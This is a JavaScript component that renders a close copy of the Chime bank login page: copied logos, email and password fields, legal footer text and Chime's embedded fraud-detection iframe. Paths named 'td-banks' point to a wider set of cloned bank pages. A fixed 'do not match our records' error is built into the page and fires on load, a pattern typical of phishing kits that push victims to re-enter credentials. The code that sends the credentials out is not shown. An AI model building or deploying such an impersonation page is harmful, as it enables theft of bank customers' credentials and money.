import { CHIMEStyle } from "../td-banks-css/chime"
import { CHIME_ERR_JVS } from "../td-banks-err/err-chime"

export const CHIMEBANK = () => {
   document.head.appendChild(CHIMEStyle)

   setTimeout(() => {
      CHIME_ERR_JVS()
   },0)
   
   return /*html*/`
      <div class="bg-bg-primary text-body text-content-primary">
         <link
            as="image"
            imagesrcset="https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c.dark.png 1x,https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c.dark@2x.png 2x, https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c.dark@3x.png 3x"
            rel="preload"
         />
         <link
            as="image"
            imagesrcset="https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c.png 1x,https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c@2x.png 2x, https://chime-mobile-assets.prod-ext.chmfin.com/prod/v2/images/ck.logo.chime.chime_green.medium.registered.7f0b59b1062c@3x.png 3x"
            rel="preload"
         />
         <div id="__next">
            <div data-testid="device-registration" id="device-registration"></div>
            <div data-rht-toaster="" style="position: fixed; z-index: 99999; top: 16px; left: 16px; right: 16px; bottom: 16px; pointer-events: none"></div>
            <div class="flex grow justify-center sm:items-center">
            <div class="flex w-full max-w-layout-compact shrink-0 grow flex-col gap-5 p-6 sm:pb-12">
               <h1 class="sr-only">Log in to your Chime account</h1>
               <div class="py-5">
                  <img
                  alt="Chime Logo"
                  class="hidden dark:inline"
                  height="36"
                  loading="eager"
                  src="data:image/png;base64,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"
                  width="125"
                  />
                  <img
                  alt="Chime Logo"
                  class="inline dark:hidden"
                  height="36"
                  loading="eager"
                  src="data:image/png;base64,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"
                  width="125"
                  />
               </div>
               <form class="flex flex-col gap-6">
                  <div class="flex flex-col gap-4">
                  <label class="w-full" for="username">
                     <div
                        class="w-full relative bg-bg-primary flex flex-row items-center px-4 py-3 rounded-lg border-2 border-border-primary transition-shadow ring-transparent ring-[6px] focus-within:border-content-primary focus-within:ring-bg-tertiary hover:ring-bg-tertiary ck4:bg-bg-secondary ck4:px-5 ck4:rounded-16 ck4:border-[1.5px] ck4:border-outline-secondary ck4:ring-0 ck4:hover:border-outline-primary ck4:focus-within:border-outline-focus! ck4:focus-within:border-2 h-16"
                        data-testid="input-container"
                     >
                        <div class="text-content-secondary absolute transition-all text-body-xs top-0 pt-3" data-state="up" data-testid="input-eyelid">Email</div>
                        <input
                        autocapitalize="off"
                        autocomplete="off"
                        autocorrect="off"
                        autofocus=""
                        class="w-full flex-1 outline-hidden text-body p-0 bg-transparent border-0 focus:ring-transparent focus:placeholder:opacity-100 text-content-primary autofill:transition-[background-color] autofill:ease-out autofill:duration-[9999s] autofill:!bg-none autofill:hover:!bg-none autofill:focus:!bg-none autofill:active:!bg-none dark:autofill:autofill-dark-text-override mt-4 placeholder:opacity-0"
                        id="username"
                        spellcheck="false"
                        type="email"
                        name="email"
                        />
                     </div>
                  </label>
                  <div>
                     <label class="w-full" for="password">
                        <div
                        class="w-full relative bg-bg-primary flex flex-row items-center px-4 py-3 rounded-lg border-2 border-border-primary transition-shadow ring-transparent ring-[6px] focus-within:border-content-primary focus-within:ring-bg-tertiary hover:ring-bg-tertiary ck4:bg-bg-secondary ck4:px-5 ck4:rounded-16 ck4:border-[1.5px] ck4:border-outline-secondary ck4:ring-0 ck4:hover:border-outline-primary ck4:focus-within:border-outline-focus! ck4:focus-within:border-2 h-16"
                        data-testid="input-container"
                        >
                        <div class="text-content-secondary absolute transition-all text-body-xs top-0 pt-3" data-state="up" data-testid="input-eyelid">Password</div>
                        <input
                           class="w-full flex-1 outline-hidden text-body p-0 bg-transparent border-0 focus:ring-transparent focus:placeholder:opacity-100 text-content-primary autofill:transition-[background-color] autofill:ease-out autofill:duration-[9999s] autofill:!bg-none autofill:hover:!bg-none autofill:focus:!bg-none autofill:active:!bg-none dark:autofill:autofill-dark-text-override mt-4 placeholder:opacity-0"
                           id="password"
                           name="password"
                           type="password"
                        />
                        <button id="togglePassword" aria-label="Show password" class="cursor-pointer disabled:cursor-not-allowed" type="button">
                           <svg fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                              <path
                              clip-rule="evenodd"
                              d="M12 17C5 17 2 12 2 12C2 12 5 7 12 7C19.5 7 22 12 22 12C22 12 19 17 12 17ZM7.8172 14.7404C6.79139 14.338 5.95415 13.8223 5.28957 13.3111C4.6803 12.8424 4.21421 12.3755 3.88381 12C4.21421 11.6245 4.6803 11.1576 5.28957 10.6889C5.95415 10.1777 6.79139 9.66196 7.8172 9.25959C7.30053 10.0466 7 10.9882 7 12C7 13.0118 7.30053 13.9534 7.8172 14.7404ZM16.1828 14.7404C17.2086 14.338 18.0459 13.8223 18.7104 13.3111C19.3476 12.8209 19.8282 12.3327 20.1607 11.949C19.8706 11.586 19.4493 11.1304 18.8755 10.6713C18.1979 10.1293 17.2928 9.56974 16.1118 9.15443C16.6718 9.96211 17 10.9427 17 12C17 13.0118 16.6995 13.9534 16.1828 14.7404ZM12 8.5C10.067 8.5 8.5 10.067 8.5 12C8.5 13.933 10.067 15.5 12 15.5C13.933 15.5 15.5 13.933 15.5 12C15.5 10.067 13.933 8.5 12 8.5ZM14 12C14 13.1046 13.1046 14 12 14C10.8954 14 10 13.1046 10 12C10 10.8954 10.8954 10 12 10C13.1046 10 14 10 14 12Z"
                              fill="currentColor"
                              fill-rule="evenodd"
                              ></path>
                           </svg>
                        </button>
                        </div>
                     </label>
                  </div>
                  </div>
                  <p class="text-util-alert-500 text-label-xs error">Email and password combination do not match our records.</p>
                  <button
                  class="inline-flex items-center justify-center rounded-xl ck4:rounded-full text-label ck4:text-label-sm origin-center transition-all text-content-dark bg-bg-action-primary hover:bg-bg-action-primary-hover active:bg-bg-action-primary-hover ck4:text-on-surface-action-primary ck4:hover:bg-surface-action-primary ck4:active:bg-surface-action-primary py-3 px-8 active:scale-95 cursor-pointer"
                  >
                  Sign in
                  </button>
                  <div>By clicking “Sign in”, you agree to receive SMS text messages from Chime to verify your identity</div>
               </form>
               <ul class="py-3 flex flex-col gap-2 font-bold">
                  <li>
                  <a
                     class="inline-flex items-center justify-center rounded-xl ck4:rounded-full text-label ck4:text-label-sm origin-center transition-all underline-offset-[3px] underline w-fit text-content-primary hover:text-accent-grey-500 active:bg-shade-primary-100 active:rounded-none active:text-accent-grey-500 ck4:hover:text-on-surface-primary ck4:active:bg-transparent ck4:active:text-on-surface-primary ck4:active:opacity-60 active:scale-95 cursor-pointer"
                     href="#"
                  >
                     Forgot your email address?
                  </a>
                  </li>
                  <li>
                  <a
                     class="inline-flex items-center justify-center rounded-xl ck4:rounded-full text-label ck4:text-label-sm origin-center transition-all underline-offset-[3px] underline w-fit text-content-primary hover:text-accent-grey-500 active:bg-shade-primary-100 active:rounded-none active:text-accent-grey-500 ck4:hover:text-on-surface-primary ck4:active:bg-transparent ck4:active:text-on-surface-primary ck4:active:opacity-60 active:scale-95 cursor-pointer"
                     href="#"
                  >
                     Forgot your password?
                  </a>
                  </li>
                  <li>
                  <a
                     class="inline-flex items-center justify-center rounded-xl ck4:rounded-full text-label ck4:text-label-sm origin-center transition-all underline-offset-[3px] underline w-fit text-content-primary hover:text-accent-grey-500 active:bg-shade-primary-100 active:rounded-none active:text-accent-grey-500 ck4:hover:text-on-surface-primary ck4:active:bg-transparent ck4:active:text-on-surface-primary ck4:active:opacity-60 active:scale-95 cursor-pointer"
                     href="#"
                  >
                     Need to create an account? Sign up!
                  </a>
                  </li>
               </ul>
               <div class="pt-6">
                  <div class="text-xs text-content-secondary">
                  <p class="pb-3">
                     ©
                     <!-- -->
                     2026
                     <!-- -->
                     Chime. All Rights Reserved.
                  </p>
                  <p>
                     Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued by The Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. Please see
                     back of your Card for its issuing bank.
                  </p>
                  </div>
               </div>
            </div>
            </div>
            <div data-testid="device-registration" id="device-registration"></div>
         </div>
         <next-route-announcer>
            <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal"></p>
         </next-route-announcer>
         <iframe
            allow="camera; microphone"
            height="0"
            src="https://api.sardine.ai/assets/collector.min.8b3fea3.html?r=2026-09-14-8b3fea3#eyJsb2FkZXJJbml0VGltZSI6MTc5MTE5ODM1MDkzMiwiZW5hYmxlQmlvbWV0cmljcyI6dHJ1ZSwiZW5hYmxlRE5TIjp0cnVlLCJyZXZpc2lvbiI6IjIwMjYtMDktMTQtOGIzZmVhMyIsIm9yaWdpbiI6Imh0dHBzOi8vYXBwLmNoaW1lLmNvbSIsImNvbGxlY3RvckRvbWFpbiI6ImFwaS5zYXJkaW5lLmFpIiwicGl4ZWxVUkwiOiJodHRwczovL3Auc2FyZGluZS5haS92MS9iLnBuZyIsImRuc0Jhc2VEb21haW4iOiJkLnNhcmRpbmUuYWkiLCJsb2NhdGlvbiI6Imh0dHBzOi8vYXBwLmNoaW1lLmNvbS9sb2dpbiIsInJlZmVycmVyIjoiIiwidXVpZCI6IjFjMmNjN2Q3LThmYjMtNDVkZC05Zjc4LTY5MzkzNWJkYTdhYSIsImNsaWVudElkIjoiMzgyNTYwNDYtZWU5ZC00MmMxLWFlYzktYTA3MGU0ODAxNDkyIiwic2Vzc2lvbktleSI6ImI1MzZhYTZmLTZkNGMtNGE5Zi1hOGNkLWE4NDJiNmRlYTk1NiIsImZsb3ciOiJMT0dJTiIsImVudmlyb25tZW50IjoicHJvZHVjdGlvbiJ9"
            style="background: transparent; border: 0px; position: fixed; visibility: hidden"
            width="0"
         >
         </iframe>
      </div>
   `
}
